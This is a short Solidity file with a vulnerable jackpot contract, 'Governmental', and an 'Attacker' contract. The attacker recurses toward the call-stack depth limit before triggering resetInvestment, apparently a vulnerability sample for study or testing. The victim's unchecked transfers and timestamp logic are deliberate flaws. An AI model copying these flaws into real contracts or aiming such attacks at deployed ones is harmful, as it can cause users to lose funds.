contract Governmental {
	address public owner;
	address public lastInvestor;
	uint public jackpot = 1 ether;
	uint public lastInvestmentTimestamp;
	uint public ONE_MINUTE = 1 minutes;
	constructor() public {
	owner = msg.sender;
	if(msg.value < 1 ether){
	throw;}
	}
	function invest() public {
	if(msg.value < jackpot / 2){
	throw;}
	lastInvestor = msg.sender;
	jackpot += msg.value / 2;
	lastInvestmentTimestamp = block.timestamp;
	}
	function resetInvestment() public {
	if(block.timestamp < lastInvestmentTimestamp + ONE_MINUTE){
	throw;}
	lastInvestor.transfer(jackpot);
	owner.transfer(this.balance - 1 ether);
	lastInvestor = 0;
	jackpot = 1 ether;
	lastInvestmentTimestamp = 0;
	}
	
}contract Attacker {
	function attack(address target, uint count) public {
	if(0 <= count && count < 1023){
	this.attack.gas(msg.gas - 2000)(target, count + 1);
	}
	else{
	Governmental(target).resetInvestment();
	}
	}
	
}